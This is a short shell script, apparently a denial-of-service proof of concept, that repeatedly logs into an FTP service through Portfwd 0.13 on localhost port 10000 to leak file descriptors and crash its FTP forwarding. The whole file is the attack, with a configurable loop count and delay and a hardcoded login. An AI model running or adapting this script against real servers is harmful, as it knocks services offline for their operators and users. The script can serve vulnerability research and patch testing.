#! /bin/sh
#
# Crash FTP forwarding on Portfwd 0.13
#
# $1 = turns
# $2 = delay

do_fd_leak() {
pftp -ni localhost 10000 << __EOF__
user everton nike=1T
ls
quit
__EOF__
}

t=30
[ -n "$1" ] && [ $1 -gt 0 ] && t=$1

d=0
[ -n "$2" ] && [ $2 -gt 0 ] && d=$2

while [ $t -gt 0 ]; do
	echo "turns to go: $t"
	echo "sleeping $d seconds"
	sleep $d
	do_fd_leak
	t=$(($t - 1))
done
